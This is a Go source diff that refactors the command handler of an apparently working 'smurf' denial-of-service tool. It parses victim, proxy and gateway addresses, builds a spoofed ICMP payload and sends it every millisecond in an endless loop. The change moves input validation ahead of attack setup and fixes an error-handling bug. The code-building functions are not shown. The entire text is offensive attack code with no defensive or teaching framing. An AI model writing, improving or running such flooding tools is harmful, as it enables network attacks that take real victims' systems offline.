@@ -14,39 +14,34 @@ import (
 var version string // injected at build-time
 
 func attackValidator(ctx *cli.Context) error {
-	return assertSet(ctx, victimFlag, proxyFlag, gatewayFlag, ifaceFlag)
+	return assertSet(ctx, victimFlag, proxyFlag, ifaceFlag, gatewayFlag)
 }
 
 func attackHandler(ctx *cli.Context) error {
 	banner := "Victim: %s\nICMP to: %s\nRun Every: %s\nPayload:\n---\n%v---\n"
+
+	victim := net.ParseIP(ctx.String(name(victimFlag)))
+	if victim == nil {
+		return errors.New("invalid victim IP address")
+	}
+
+	proxy := net.ParseIP(ctx.String(name(proxyFlag)))
+	if proxy == nil {
+		return errors.New("invalid proxy IP address")
+	}
 
 	gw, err := net.ParseMAC(ctx.String(name(gatewayFlag)))
 	if err != nil {
 		return errors.Wrap(err, "could not parse gateway MAC address")
 	}
 
-	conf := config{
-		victim:     net.ParseIP(ctx.String(name(victimFlag))),
-		proxy:      net.ParseIP(ctx.String(name(proxyFlag))),
-		iface:      ctx.String(name(ifaceFlag)),
-		gatewayMAC: gw,
-	}
-
-	if conf.victim == nil {
-		return errors.Wrap(err, "invalid victim IP address")
-	}
-
-	if conf.proxy == nil {
-		return errors.Wrap(err, "invalid proxy IP address")
-	}
-
-	s, err := newSmurf(conf)
+	s, err := newSmurf(victim, proxy, ctx.String(name(ifaceFlag)), gw)
 	if err != nil {
 		return err
 	}
 
 	interval := time.Millisecond * 1
-	fmt.Printf(banner, conf.victim, conf.proxy, interval.String(), hex.Dump(s.payload))
+	fmt.Printf(banner, victim, proxy, interval.String(), hex.Dump(s.payload))
 	for {
 		if err = s.execute(); err != nil {
 			return err
